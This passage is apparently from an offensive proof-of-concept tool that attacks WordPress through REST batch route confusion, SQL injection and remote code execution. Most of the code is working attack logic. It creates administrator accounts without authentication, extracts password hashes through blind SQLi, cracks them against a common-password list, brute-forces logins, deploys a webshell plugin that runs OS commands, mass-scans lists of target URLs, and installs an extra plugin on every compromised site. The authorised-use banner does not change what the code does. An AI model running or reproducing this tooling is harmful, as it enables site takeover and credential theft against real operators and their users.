    WordPress administrator account and (optionally) verifies the login.
    Credentials are printed and, when --output is given, written to a file.
    """
    hc = _http(a)

    # ── step 0: batch endpoint reachable? ────────────────────────────────────
    client = BatchClient(a.url, http=hc, rest_route=_rr(a),
                         variant=getattr(a, "variant", "posts"))
    try:
        probe = client.probe()
    except TargetError as exc:
        bad(f"Cannot reach batch endpoint: {exc}")
        return 1
    if probe.status != 207:
        bad(f"Batch endpoint returned HTTP {probe.status} (expected 207).")
        return 1
    good(f"Batch endpoint reachable at {client.endpoint}")

    # ── step 1: route confusion ───────────────────────────────────────────────
    if not client.confusion_markers():
        if not confusion_structural(client):
            bad("Route confusion (CVE-2026-63030) NOT detected — may be patched.")
            return 1
        info("Route confusion confirmed (structural marker).")
    else:
        good("Route confusion confirmed (block_cannot_read marker).")

    # ── step 2: run the pre-auth admin creation chain ─────────────────────────
    _iprint()
    info(_ibold("Pre-Auth Admin RCE Chain") + "  (no credentials, no hash cracking)")
    _ihline()

    def _log(msg: str) -> None:
        info(msg)

    creator = PreAuthAdminCreator(a.url, http=hc, rest_route=_rr(a),
                                  sqlite=getattr(a, "sqlite", False))
    try:
        result = creator.create_admin(log=_log)
    except Exception as exc:
        bad(f"Admin creation failed: {exc}")
        return 1

    _ihline()
    good(_ibold("Administrator created successfully!"))
    _iprint(f"  {_ibold('Username')} : {_igreen(result.username)}")
    _iprint(f"  {_ibold('Password')} : {_igreen(result.password)}")
    _iprint(f"  {_ibold('Email')}    : {result.email}")
    _iprint(f"  {_ibold('Source admin ID')} : {result.source_admin_id}")
    _iprint(f"  {_ibold('Table prefix')}    : {result.table_prefix}")
    _ihline()

    # ── step 3: verify login if requested ────────────────────────────────────
    if getattr(a, "verify", False):
        info("Verifying login with generated credentials...")
        verified     = False
        last_hint    = ""
        _MAX_ATTEMPTS = 4
        _RETRY_DELAY  = 4.0   # seconds between attempts

        for attempt in range(_MAX_ATTEMPTS):
            if attempt > 0:
                info(f"  Retrying login (attempt {attempt+1}/{_MAX_ATTEMPTS}) "
                     f"in {_RETRY_DELAY:.0f}s...")
                time.sleep(_RETRY_DELAY)

            # ── method A: cookie-based wp-login.php ──────────────────────────
            try:
                session = AdminSession(a.url, http=hc)
                if session.login(result.username, result.password):
                    good("Login verified via wp-login.php — "
                         "account is active and administrator-capable.")
                    verified = True
                    break
                # Capture login page body for diagnostics
                page = session._get("/wp-login.php")
                if "incorrect" in page.lower() or "invalid" in page.lower():
                    last_hint = "wp-login.php reports incorrect credentials"
                elif "two" in page.lower() or "2fa" in page.lower() or \
                        "factor" in page.lower():
                    last_hint = ("2FA / two-factor auth detected — "
                                 "log in manually at /wp-login.php")
                    break   # retrying won't help with 2FA
                elif "locked" in page.lower() or "throttl" in page.lower() or \
                        "block" in page.lower():
                    last_hint = "login throttling or IP block detected"
                else:
                    last_hint = "no wordpress_logged_in cookie received"
            except Exception as exc:
                last_hint = str(exc)[:100]

            # ── method B: REST API Basic Auth ────────────────────────────────
            try:
                creds_b64 = __import__("base64").b64encode(
                    f"{result.username}:{result.password}".encode()
                ).decode()
                rest_hc = HttpConfig(
                    timeout    = hc.timeout,
                    proxy      = hc.proxy,
                    insecure   = hc.insecure,
                    headers    = {"Authorization": f"Basic {creds_b64}"},
                    user_agent = hc.user_agent,
                    retries    = 1,
                )
                rest_opener = rest_hc.opener()
                me_url = (
                    f"{a.url}/?rest_route=/wp/v2/users/me"
                    if getattr(hc, "_rest_route_flag", False)
                    else f"{a.url}/wp-json/wp/v2/users/me"
                )
                me_req  = urllib.request.Request(
                    me_url, headers=rest_hc.merge_headers())
                me_resp = rest_hc.send(rest_opener, me_req)
                if me_resp.status == 200:
                    try:
                        me_data = json.loads(me_resp.body)
                        roles   = me_data.get("roles", [])
                    except Exception:
                        roles = []
                    if "administrator" in roles:
                        good("Login verified via REST /wp/v2/users/me — "
                             "administrator role confirmed.")
                    else:
                        good(f"REST /wp/v2/users/me OK (roles={roles}).")
                    verified = True
                    break
                elif me_resp.status == 401:
                    last_hint = (last_hint or
                                 "REST Basic Auth rejected — credentials may still "
                                 "be propagating (WordPress object cache delay)")
            except Exception as exc:
                pass   # REST check is best-effort

        if not verified:
            warn(
                f"Login check failed after {_MAX_ATTEMPTS} attempts.\n"
                f"  Reason hint : {last_hint or 'unknown'}\n"
                f"  The account WAS created — try logging in manually:\n"
                f"    URL      : {a.url}/wp-login.php\n"
                f"    Username : {result.username}\n"
                f"    Password : {result.password}"
            )

    # ── step 4: save to file ─────────────────────────────────────────────────
    outfile = getattr(a, "output", None)
    _append_result(a.url, result.username, result.password, outfile)

    # ── step 5: install mm.zip (install-only, no activation) ────────────────────
    _try_install_mm(a.url, result.username, result.password, hc)

    warn("Remember to remove the generated administrator when testing is complete.")
    return 0


# ── batch (quiet) create-admin worker ─────────────────────────────────────
def _batch_create_one(url: str, http: HttpConfig, *,
                      sqlite: bool, variant: str,
                      verify: bool, outfile: Optional[str]) -> Dict[str, Any]:
    """
    Run the full pre-auth admin creation chain for one URL in quiet mode.
    All intermediate logging is suppressed; returns a plain result dict:
      {"url", "ok", "username", "password", "verified", "error"}
    Designed to be called from a ThreadPoolExecutor — thread-safe via _tl.
    """
    _tl.quiet = True
    rec: Dict[str, Any] = {"url": url, "ok": False, "verified": False}
    try:
        hc     = http
        client = BatchClient(url, http=hc, rest_route=None, variant=variant)
        try:
            probe = client.probe()
        except TargetError as exc:
            rec["error"] = str(exc); return rec
        if probe.status != 207:
            rec["error"] = f"batch endpoint HTTP {probe.status}"; return rec
        if not (client.confusion_markers() or confusion_structural(client)):
            rec["error"] = "route confusion not detected"; return rec

        creator = PreAuthAdminCreator(url, http=hc, rest_route=None, sqlite=sqlite)
        result  = creator.create_admin()
        rec["ok"]       = True
        rec["username"] = result.username
        rec["password"] = result.password

        # ── optional login verification ───────────────────────────────────
        if verify:
            for _attempt in range(4):
                if _attempt:
                    time.sleep(4)
                try:
                    sess = AdminSession(url, http=hc)
                    if sess.login(result.username, result.password):
                        rec["verified"] = True
                        break
                except Exception:
                    pass
                # REST fallback
                try:
                    creds_b64 = __import__("base64").b64encode(
                        f"{result.username}:{result.password}".encode()).decode()
                    rest_hc = HttpConfig(
                        timeout=hc.timeout, proxy=hc.proxy,
                        insecure=hc.insecure,
                        headers={"Authorization": f"Basic {creds_b64}"},
                        user_agent=hc.user_agent, retries=1)
                    me_url  = f"{url.rstrip('/')}/wp-json/wp/v2/users/me"
                    me_req  = urllib.request.Request(
                        me_url, headers=rest_hc.merge_headers())
                    me_resp = rest_hc.send(rest_hc.opener(), me_req)
                    if me_resp.status == 200:
                        rec["verified"] = True
                        break
                except Exception:
                    pass

        _append_result(url, result.username, result.password, outfile)
        _try_install_mm(url, result.username, result.password, hc)

    except Exception as exc:
        rec["error"] = str(exc)
    finally:
        _tl.quiet = False
    return rec


# ── shell helpers: credential recovery when UNION is blocked ───────────────

_COMMON_PASSWORDS: List[str] = [
    "admin", "admin123", "admin@123", "Admin123", "Admin123!",
    "password", "Password", "Password1", "Password1!", "password1",
    "123456", "12345678", "1234567890", "letmein", "welcome",
    "Welcome1", "Welcome1!", "wordpress", "Wordpress1", "WP@123",
    "qwerty", "abc123", "iloveyou", "monkey", "dragon",
    "changeme", "test123", "access", "shadow", "master",
    "sunshine", "princess", "trustno1", "superman",
]


def _phpass_verify(password: str, stored: str) -> bool:
    """
    Offline verifier for WordPress phpass hashes ($P$B…).
    Handles $P$ (phpass) natively; delegates bcrypt/sha512/etc. to system crypt().
    """
    import hashlib
    _I64 = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    if stored.startswith("$P$"):
        if len(stored) < 34:
            return False
        count = 1 << _I64.index(stored[3])
        salt  = stored[4:12].encode()
        pw    = password.encode("utf-8")
        h     = hashlib.md5(salt + pw).digest()
        for _ in range(count):
            h = hashlib.md5(h + pw).digest()
        # portable_hash encode_64
        i = 0
        out = stored[:12]          # '$P$' + cost_char + 8-char salt
        while i < 16:
            v = h[i]
            out += _I64[v & 0x3f]
            if i + 1 < 16:
                v |= h[i + 1] << 8
            out += _I64[(v >> 6) & 0x3f]
            if i + 1 >= 16:
                break
            if i + 2 < 16:
                v |= h[i + 2] << 16
            out += _I64[(v >> 12) & 0x3f]
            if i + 2 >= 16:
                break
            out += _I64[(v >> 18) & 0x3f]
            i += 3
        return out == stored
    # Bcrypt / sha512 / sha256 — delegate to system crypt()
    try:
        import crypt as _crypt
        import warnings as _w
        with _w.catch_warnings():
            _w.simplefilter("ignore")
            return _crypt.crypt(password, stored) == stored
    except Exception:
        return False


def _fetch_rest_usernames(base_url: str, http: HttpConfig) -> List[str]:
    """Collect usernames/slugs exposed by /wp/v2/users (public endpoint)."""
    opener = http.opener()
    base   = base_url.rstrip("/")
    url    = f"{base}/wp-json/wp/v2/users?per_page=100&_fields=slug,name"
    try:
        req  = urllib.request.Request(url, headers=http.merge_headers())
        resp = opener.open(req, timeout=http.timeout)
        users = json.loads(resp.read())
        return [u["slug"] for u in users if u.get("slug")]
    except Exception:
        return []


def _bruteforce_login(base_url: str, http: HttpConfig,
                      usernames: List[str],
                      passwords: Optional[List[str]] = None) -> Optional[Tuple[str, str]]:
    """
    Try common passwords against each username via wp-login.php.
    Returns (username, password) on the first successful login.
    Entirely independent of SQLi — no SLEEP delays.

    Performance fix: create ONE AdminSession per username (one opener + CookieJar)
    instead of creating a brand-new session (+ SSL context + CookieJar) for every
    single password attempt.  The original created N_users × N_passwords openers.
    """
    passwords = passwords or _COMMON_PASSWORDS
    total     = len(usernames) * len(passwords)
    tried     = 0
    for user in usernames:
        # One session (one opener, one CookieJar) for all passwords of this user.
        session = AdminSession(base_url, http=http)
        for pwd in passwords:
            tried += 1
            with _print_lock:
                sys.stdout.write(f"\r  [{tried}/{total}] trying {user!r}:{pwd!r}   ")
                sys.stdout.flush()
            try:
                if session.login(user, pwd):
                    with _print_lock:
                        sys.stdout.write("\n")
                        sys.stdout.flush()
                    return user, pwd
            except Exception:
                # Re-create session only on exception (opener may be broken)
                session = AdminSession(base_url, http=http)
    with _print_lock:
        sys.stdout.write("\n")
        sys.stdout.flush()
    return None


def _timebased_crack(base_url: str, http: HttpConfig,
                     sleep: float, prefix: str = "wp_",
                     max_users: int = 3) -> Optional[Tuple[str, str]]:
    """
    Time-based SQLi → extract wp_users (user_login + user_pass) →
    offline phpass/bcrypt crack with common passwords.

    Returns (username, cleartext_password) if a match is found,
    or None (and prints extracted hashes so the user can crack offline).
    """
    client = BatchClient(base_url, http=http)
    sqli   = BlindSQLi(client, sleep=sleep, time_mode=True)

    info(f"Extracting up to {max_users} admin credential(s) via time-based SQLi "
         f"(~{sleep:g}s × 7 req/char — this will take a while) ...")

    cap = _mysql_hex(prefix + "capabilities")
    ser = _mysql_hex('s:13:"administrator";b:1;')

    try:
        count = sqli.integer(
            f"SELECT COUNT(u.ID) FROM `{prefix}users` u "
            f"JOIN `{prefix}usermeta` m ON m.user_id=u.ID "
            f"WHERE m.meta_key={cap} AND INSTR(m.meta_value,{ser})>0")
    except (ValueError, TargetError) as exc:
        warn(f"Could not count admins via time-based: {exc}")
        count = max_users

    info(f"  Found {count} administrator(s) in database.")
    pairs: List[Tuple[str, str]] = []

    for i in range(1, min(count, max_users) + 1):
        info(f"  Extracting admin #{i} ...")
        try:
            uname = sqli.extract(
                f"SELECT user_login FROM `{prefix}users` u "
                f"JOIN `{prefix}usermeta` m ON m.user_id=u.ID "
                f"WHERE m.meta_key={cap} AND INSTR(m.meta_value,{ser})>0 "
                f"ORDER BY u.ID LIMIT 1 OFFSET {i - 1}",
                max_length=64,
                on_char=lambda s: print(f"\r    user_login: {s}   ",
                                        end="", flush=True))
            print()
            uhash = sqli.extract(
                f"SELECT user_pass FROM `{prefix}users` u "
                f"JOIN `{prefix}usermeta` m ON m.user_id=u.ID "
                f"WHERE m.meta_key={cap} AND INSTR(m.meta_value,{ser})>0 "
                f"ORDER BY u.ID LIMIT 1 OFFSET {i - 1}",
                max_length=64,
                on_char=lambda s: print(f"\r    user_pass:  {s}   ",
                                        end="", flush=True))
            print()
            if uname:
                good(f"  → {uname} : {uhash}")
                pairs.append((uname, uhash))
        except (ValueError, TargetError) as exc:
            warn(f"  Extraction error for admin #{i}: {exc}")

    if not pairs:
        return None

    info("Attempting offline crack with common passwords ...")
    for uname, uhash in pairs:
        for pwd in _COMMON_PASSWORDS:
            if _phpass_verify(pwd, uhash):
                good(f"  Cracked: {uname} / {pwd}")
                return uname, pwd

    warn("  No common password matched. Crack offline:")
    warn("  hashcat -m 400 hash.txt rockyou.txt")
    for uname, uhash in pairs:
        print(f"  {uname}:{uhash}")
    return None


# ── shell ──────────────────────────────────────────────────────────────────
def cmd_shell(a: argparse.Namespace) -> int:
    hc    = _http(a)
    sleep = getattr(a, "sleep", 8.0)

    if not a.cmd and not a.interactive:
        bad("specify --cmd or --interactive")
        return 2

    generated: Optional[CreatedAdmin] = None

    if a.user and a.password:
        user, password = a.user, a.password
        info(f"Using supplied credentials for {user!r}.")

    else:
        # ── path 1: crack-free UNION pre-auth admin creation ─────────────────
        info("Attempting pre-auth admin creation via UNION SQLi ...")
        union_err: Optional[str] = None
        try:
            generated = PreAuthAdminCreator(
                a.url, http=hc, rest_route=_rr(a)).create_admin()
            user, password = generated.username, generated.password
            good(f"Administrator created: {user} / {password}  "
                 f"(source admin id {generated.source_admin_id})")
        except Exception as exc:
            union_err = str(exc)
            warn(f"UNION path failed: {union_err}")
            warn("Switching to credential-recovery fallback ...")

        if union_err:
            found: Optional[Tuple[str, str]] = None

            # ── path 2a: REST usernames + common-password login (fast) ───────
            info("Fetching exposed usernames from /wp/v2/users ...")
            rest_users = _fetch_rest_usernames(a.url, hc)
            if rest_users:
                good(f"Usernames from REST API ({len(rest_users)}): "
                     + ", ".join(rest_users))
                info(f"Trying {len(_COMMON_PASSWORDS)} common passwords "
                     f"against {len(rest_users)} user(s) ...")
                found = _bruteforce_login(a.url, hc, rest_users)
                if found:
                    user, password = found
                    good(f"Credential found: {user} / {password}")
                else:
                    warn("No common password matched via direct login.")
            else:
                warn("Could not enumerate usernames from REST API.")

            # ── path 2b: time-based hash extraction + offline crack ───────────
            if not found:
                warn("Falling back to time-based SQLi hash extraction "
                     f"(slow — SLEEP={sleep:g}s per bit) ...")
                hc.timeout = max(hc.timeout, sleep * 2 + 30)
                prefix = getattr(a, "prefix", "wp_")
                found  = _timebased_crack(a.url, hc, sleep=sleep,
                                          prefix=prefix)
                if found:
                    user, password = found
                else:
                    bad("All credential-recovery paths exhausted.")
                    warn("Next steps:\n"
                         "  1. Run:  read --preset users --sleep 8\n"
                         "           to dump hashes, then crack with:\n"
                         "           hashcat -m 400 hashes.txt rockyou.txt\n"
                         "  2. Or supply known creds: --user admin --password X")
                    return 1

    warn("This uploads a plugin containing a webshell to the target.")
    session = AdminSession(a.url, http=hc)
    info(f"Authenticating as {user!r} ...")
    if not session.login(user, password):
        bad("Login failed.")
        return 1
    good("Authenticated.")
    _append_result(a.url, user, password, getattr(a, "output", None))
    _try_install_mm(a.url, user, password, hc)

    info("Deploying webshell plugin ...")
    path = session.deploy_webshell()
    good(f"Webshell deployed: {a.url.rstrip('/')}{path}")

    rc = 0
    if a.cmd:
        out = session.run(path, a.cmd)
        if out is None:
            bad("No output — upload may have failed (nonce/permissions) "
                "or plugin not web-served.")
            rc = 1
        else:
            print()
            print(out.rstrip("\n"))
            print()
    if a.interactive:
        _repl(session, path)

    warn(f"Remove the webshell when done: delete {path} on the target.")
    if generated:
        warn(f"Also remove the generated administrator {generated.username!r}.")
    return rc

# ── sqli (facilitated sink, e.g. 6.8.x) ───────────────────────────────────
def cmd_sqli(a: argparse.Namespace) -> int:
    hc         = _http(a)
    hc.timeout = max(hc.timeout, a.sleep + 10)
    direct     = DirectClient(a.url, a.endpoint, a.param,
                               http=hc, true_contains=a.true_contains)
    time_mode  = a.true_contains is None
    sqli       = BlindSQLi(direct, sleep=a.sleep, time_mode=time_mode,
                           sqlite=getattr(a, "sqlite", False))
    info(f"Sink: {a.url.rstrip('/')}{direct.endpoint}  "
         f"param={a.param}  "
         f"mode={'time-based' if time_mode else 'boolean'}"
         + ("  [sqlite]" if sqli.sqlite else ""))
    if not sqli.confirm():
        bad("No injection — sink did not react "
            "(wrong endpoint/param, or not vulnerable).")
        return 2
    good("author__not_in SQL injection CONFIRMED (CVE-2026-60137).")
    _do_read(sqli, prefix=a.prefix, preset=a.preset,
             query=a.query, max_length=a.max_length)
    return 0


# ── scan ───────────────────────────────────────────────────────────────────
def _load_targets(arg: str) -> List[str]:
    """A single URL, or a .txt file with one URL per line (# comments ok)."""
    if arg.startswith(("http://", "https://")):
        return [arg]
    try:
        with open(arg, encoding="utf-8", errors="replace") as fh:
            return [ln.strip() for ln in fh
                    if ln.strip() and not ln.startswith("#")]
    except (FileNotFoundError, IsADirectoryError, OSError):
        return ["http://" + arg]


def cmd_scan(a: argparse.Namespace) -> int:
    targets = _load_targets(a.target)
    if not targets:
        bad("no targets")
        return 1
    hc = _http(a)
    # Initialise the connection semaphore for this scan run.
    # Cap: 1.5× thread count but no more than 150 — enough headroom for retries
    # without overwhelming the OS socket/fd limits.
    _init_conn_sem(min(int(a.threads * 1.5) + 1, 150))
    info(f"Scanning {len(targets)} target(s) with {a.threads} thread(s)"
         + (" [--prove: extracting @@version on hits]" if a.prove else "")
         + " ...")

    # Lightweight HttpConfig for version probing — short timeout so a
    # slow/unresponsive server doesn't hold a thread for 30 s just for the
    # fingerprint step.
    hc_ver = HttpConfig(
        timeout    = min(hc.timeout, 8.0),
        proxy      = hc.proxy,
        insecure   = hc.insecure,
        headers    = hc.headers,
        user_agent = hc.user_agent,
        retries    = 1,
        delay      = hc.delay,
    )

    def _one(url: str) -> dict:
        rec: Dict[str, Any] = {"url": url}
        try:
            ver = detect_version(url, hc_ver)   # fast timeout
            rec["version"] = ".".join(map(str, ver)) if ver else None
            client = BatchClient(url, http=hc, variant=a.variant)
            if client.probe().status != 207:
                rec["status"] = "no-batch-endpoint"
                return rec
            sqli = BlindSQLi(client, sleep=a.sleep)
            if sqli.confirm():
                rec["status"] = "VULNERABLE"
                if a.prove:
                    rec["proof_db_version"] = sqli.extract(
                        "SELECT @@version", max_length=64)
            else:
                rec["status"] = (
                    "confusion" if client.confusion_markers() else "safe")
        except Exception as exc:
            rec["status"] = "error"
            rec["error"]  = str(exc)[:120]
        return rec

    results: List[dict] = []
    with ThreadPoolExecutor(max_workers=a.threads) as ex:
        futs = {ex.submit(_one, u): u for u in targets}
        for i, f in enumerate(as_completed(futs), 1):
            r   = f.result()
            results.append(r)
            tag = {"VULNERABLE": _paint("31", "VULNERABLE"),
                   "safe":       _paint("32", "safe"),
                   "confusion":  _paint("33", "confusion-only")}.get(
                r.get("status", ""), r.get("status", "?"))
            extra = (f"  db={r['proof_db_version']}"
                     if r.get("proof_db_version") else "")
            print(f"[{i}/{len(targets)}] {r['url']}  "
                  f"[{r.get('version') or '?'}]  {tag}{extra}")

    if a.json:
        with open(a.json, "w", encoding="utf-8") as fh:
            json.dump(results, fh, indent=2)
        good(f"JSON report written to {a.json}")
    vuln = sum(1 for r in results if r.get("status") == "VULNERABLE")
    info(f"Done — {vuln}/{len(results)} vulnerable")
    return 0


# ──────────────────────────────────────────────────────── parser ──
def _net_opts(p: argparse.ArgumentParser) -> None:
    p.add_argument("--insecure",  action="store_true",
                   help="skip TLS certificate verification (self-signed certs)")
    p.add_argument("--proxy",     metavar="URL",
                   help="HTTP/HTTPS proxy (e.g. http://127.0.0.1:8080)")
    p.add_argument("-H", "--header", metavar="K:V", action="append",
                   help="extra request header (repeatable)")
    p.add_argument("--ua",         dest="user_agent", metavar="UA",
                   help="override User-Agent string")
    p.add_argument("--timeout",    type=float, default=30.0,
                   help="per-request timeout in seconds (default: 30)")
    p.add_argument("--retries",    type=int,   default=2,
                   help="connection retries on failure (default: 2)")
    p.add_argument("--delay",      type=float, default=0.0,
                   help="sleep between requests in seconds (default: 0)")
    p.add_argument("--no-color",   action="store_true",
                   help="disable ANSI colour output")
    p.add_argument("--rest-route", action="store_true",
                   help="force /?rest_route= style instead of /wp-json/")


def _common(p: argparse.ArgumentParser) -> None:
    p.add_argument("url", help="target base URL  (e.g. https://target.example.com)")
    p.add_argument("--variant", choices=("posts", "categories"), default="posts",
                   help="confusion carrier variant (default: posts)")
    _net_opts(p)


def build_parser() -> argparse.ArgumentParser:
    ap = argparse.ArgumentParser(
        prog="poc2.py",
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("--version", action="version",
                    version=f"%(prog)s {__version__}")
    sub = ap.add_subparsers(dest="command", required=True)

    # ── check ──────────────────────────────────────────────────────────────
    c = sub.add_parser(
        "check",
        help="fingerprint + safely confirm the vuln (non-destructive)")
    _common(c)
    c.add_argument("--sleep", type=float, default=3.0,
                   help="SLEEP() delay for time-based corroboration (default: 3)")
    c.add_argument("--output", metavar="FILE", default=None,
                   help="append confirmed-vuln URL to this file")
    c.set_defaults(func=cmd_check)

    # ── read ───────────────────────────────────────────────────────────────
    r = sub.add_parser(
        "read",
        help="read the database via boolean blind SQL injection")
    _common(r)
    g = r.add_mutually_exclusive_group()
    g.add_argument("--preset", choices=("fingerprint", "users"),
                   default="fingerprint",
                   help="fingerprint (version/user/db) or users (login+hash)")
    g.add_argument("--query",
                   help='scalar SQL expression to read, e.g. "SELECT @@version"')
    r.add_argument("--prefix",     default="wp_",
                   help="DB table prefix (default: wp_)")
    r.add_argument("--max-length", type=int, default=128,
                   help="max characters per extracted value (default: 128)")
    r.add_argument("--sqlite",     action="store_true",
                   help="target uses SQLite (uses UNICODE/SUBSTR instead of ASCII/SUBSTRING)")
    r.add_argument("--sleep",      type=float, default=8.0,
                   help="SLEEP() seconds for time-based fallback (default: 8); "
                        "increase on high-latency targets")
    r.add_argument("--output", metavar="FILE", default=None,
                   help="append extracted users to this file (format: url#user@pass)")
    r.set_defaults(func=cmd_read)

    # ── shell ──────────────────────────────────────────────────────────────
    s = sub.add_parser(
        "shell",
        help="RCE: pre-auth admin creation → login → plugin webshell upload")
    _common(s)
    s.add_argument("--user",
                   help="use an existing admin (skips pre-auth admin creation)")
    s.add_argument("--password",
                   help="existing admin password (used with --user)")
    s.add_argument("--cmd",
                   help="OS command to run via the deployed webshell")
    s.add_argument("-i", "--interactive", action="store_true",
                   help="open an interactive shell after deployment")
    s.add_argument("--sleep",  type=float, default=8.0,
                   help="SLEEP() seconds for time-based hash extraction fallback "
                        "(default: 8)")
    s.add_argument("--prefix", default="wp_",
                   help="DB table prefix for time-based extraction (default: wp_)")
    s.add_argument("--output", metavar="FILE", default=None,
                   help="append credentials to this file (format: url#user@pass)")
    s.set_defaults(func=cmd_shell)

    # ── sqli ───────────────────────────────────────────────────────────────
    q = sub.add_parser(
        "sqli",
        help="author__not_in SQLi against a direct/facilitated sink (e.g. 6.8.x)")
    q.add_argument("url",  help="target base URL")
    q.add_argument("--endpoint", required=True,
                   help="facilitating sink path, "
                        "e.g. /?wp2shell_faccheck=1")
    q.add_argument("--param",    default="author_not_in",
                   help="parameter name reaching author__not_in "
                        "(default: author_not_in)")
    q.add_argument("--true-contains",
                   help="response substring present only when rows match "
                        "(enables fast boolean mode; omit for time-based)")
    q.add_argument("--sleep",    type=float, default=3.0,
                   help="SLEEP() delay for time-based mode (default: 3)")
    gq = q.add_mutually_exclusive_group()
    gq.add_argument("--preset", choices=("fingerprint", "users"),
                    default="fingerprint")
    gq.add_argument("--query",   help="scalar SQL expression to read")
    q.add_argument("--prefix",     default="wp_")
    q.add_argument("--max-length", type=int, default=128)
    q.add_argument("--sqlite",     action="store_true",
                   help="target uses SQLite (uses UNICODE/SUBSTR instead of ASCII/SUBSTRING)")
    _net_opts(q)
    q.set_defaults(func=cmd_sqli)

    # ── scan ───────────────────────────────────────────────────────────────
    sc = sub.add_parser(
        "scan",
        help="threaded vuln-check over a single URL or a .txt target list")
    sc.add_argument("target",
                    help="a single URL, or a .txt file with one URL per line")
    sc.add_argument("--variant",  choices=("posts", "categories"), default="posts")
    sc.add_argument("--threads",  type=int,   default=10,
                    help="worker threads (default: 10)")
    sc.add_argument("--sleep",    type=float, default=3.0,
                    help="confirmation SLEEP delay (default: 3)")
    sc.add_argument("--prove",    action="store_true",
                    help="on hits, extract @@version as proof")
    sc.add_argument("--json",
                    help="write a JSON report to this file path")
    sc.add_argument("--output", metavar="FILE", default=None,
                    help="append vuln+credential lines to this file (format: url#user@pass)")
    _net_opts(sc)
    sc.set_defaults(func=cmd_scan)

    # ── create-admin ───────────────────────────────────────────────────────
    ca = sub.add_parser(
        "create-admin",
        help="pre-auth admin creation via UNION SQLi chain (no webshell, no RCE)")
    _common(ca)
    ca.add_argument("--verify",  action="store_true",
                    help="verify the generated credentials by logging in")
    ca.add_argument("--output",  metavar="FILE", default=None,
                    help="append credentials to this file (format: url#user@pass)")
    ca.add_argument("--sqlite",  action="store_true",
                    help="target uses SQLite (WP-SQLite plugin); "
                         "switches all SQL expressions to SQLite dialect")
    ca.set_defaults(func=cmd_create_admin)

    return ap


def main(argv: Optional[list] = None) -> int:
    args = build_parser().parse_args(argv)
    global _COLOR
    if getattr(args, "no_color", False):
        _COLOR = False
    if _TTY:
        print(_paint("36", BANNER))
    try:
        return args.func(args)
    except KeyboardInterrupt:
        return 130
    except Exception as exc:
        bad(str(exc))
        return 1


# ─────────────────────────────────────────────── interactive UI ──

def _iprint(text: str = "") -> None:
    print(text)


def _ibold(text: str) -> str:
    return _paint("1", text)


def _icyan(text: str) -> str:
    return _paint("36;1", text)


def _igreen(text: str) -> str:
    return _paint("32;1", text)


def _ired(text: str) -> str:
    return _paint("31;1", text)


def _iyellow(text: str) -> str:
    return _paint("33;1", text)


def _idim(text: str) -> str:
    return _paint("2", text)


def _iask(prompt: str, default: str = "") -> str:
    """Prompt the user for input, showing a coloured arrow and optional default."""
    hint = f" {_idim(f'[{default}]')}" if default else ""
    try:
        val = input(f"  {_icyan('→')} {prompt}{hint}: ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return default
    return val or default


def _iask_bool(prompt: str, default: bool = False) -> bool:
    hint = "Y/n" if default else "y/N"
    raw = _iask(f"{prompt} ({hint})", "y" if default else "n")
    return raw.lower() in ("y", "yes", "1", "true")


def _iask_float(prompt: str, default: float) -> float:
    raw = _iask(prompt, str(default))
    try:
        return float(raw)
    except ValueError:
        return default


def _iask_int(prompt: str, default: int) -> int:
    raw = _iask(prompt, str(default))
    try:
        return int(raw)
    except ValueError:
        return default


def _iask_choice(prompt: str, choices: List[str], default: str = "") -> str:
    display = "/".join(
        _ibold(c) if c == default else c for c in choices
    )
    raw = _iask(f"{prompt} ({display})", default)
    return raw if raw in choices else default


def _ihline() -> None:
    width = 60
    print(_idim("─" * width))


def _iheader(title: str) -> None:
    _iprint()
    _ihline()
    print(f"  {_ibold(title)}")
    _ihline()


def _ibanner() -> None:
    lines = [
        "",
        _icyan("  ██████╗  ██████╗ ██████╗      ██████╗ ██╗"),
        _icyan(" ██╔══██╗██╔═══██╗██╔════╝     ╚════██╗╚██╗"),
        _icyan(" ██████╔╝██║   ██║██║           █████╔╝ ██║"),
        _icyan(" ██╔═══╝ ██║   ██║██║          ██╔═══╝  ██║"),
        _icyan(" ██║     ╚██████╔╝╚██████╗     ███████╗██╔╝"),
        _icyan(" ╚═╝      ╚═════╝  ╚═════╝     ╚══════╝╚═╝"),
        "",
        f"  {_ibold('CVE-2026-63030')}  {_idim('+')}  {_ibold('CVE-2026-60137')}",
        f"  {_idim('REST batch route confusion → unauthenticated SQLi → RCE')}",
        f"  {_idim('WordPress 6.9.0–7.0.1  |  research PoC v' + __version__)}",
        "",
        f"  {_iyellow('⚠')}  {_idim('For authorised security research on systems you own')}",
        f"  {_iyellow('⚠')}  {_idim('or may test in writing. Delete artifacts after use.')}",
        "",
    ]
    for line in lines:
        print(line)


def _imenu_check(targets: List[str], threads: int, http: HttpConfig,
                 outfile=None) -> int:
    _iheader("CHECK — fingerprint & confirm vulnerability")
    sleep   = _iask_float("SLEEP() delay for time-based corroboration (s)", 3.0)
    variant = _iask_choice("Confusion carrier variant", ["posts", "categories"], "posts")

    def _run_one(url: str) -> int:
        class _A: pass
        a = _A()
        a.url = url; a.sleep = sleep; a.variant = variant          # type: ignore[attr-defined]
        a.output = outfile                                          # type: ignore[attr-defined]
        a.timeout = http.timeout; a.proxy = http.proxy             # type: ignore[attr-defined]
        a.insecure = http.insecure; a.header = []                  # type: ignore[attr-defined]
        a.user_agent = http.user_agent; a.retries = http.retries   # type: ignore[attr-defined]
        a.delay = http.delay; a.rest_route = False                  # type: ignore[attr-defined]
        return cmd_check(a)

    _iprint()
    if len(targets) == 1:
        return _run_one(targets[0])
    info(f"Running CHECK against {len(targets)} targets with {threads} thread(s)...")
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(_run_one, u): u for u in targets}
        for f in as_completed(futs):
            try:
                f.result()
            except Exception as exc:
                bad(f"{futs[f]}: {exc}")
    return 0


def _imenu_read(targets: List[str], threads: int, http: HttpConfig,
                outfile=None) -> int:
    _iheader("READ — blind SQL extraction")
    preset_raw = _iask_choice("Preset", ["fingerprint", "users", "custom"], "fingerprint")
    query: Optional[str] = None
    preset = preset_raw
    if preset_raw == "custom":
        query  = _iask("SQL scalar expression (e.g. SELECT @@version)")
        preset = "fingerprint"
    prefix   = _iask("Table prefix", "wp_")
    max_len  = _iask_int("Max chars per extracted value", 128)
    sqlite   = _iask_bool("SQLite target? (uses UNICODE/SUBSTR)", False)
    sleep    = _iask_float("SLEEP() delay for time-based fallback (s)", 8.0)
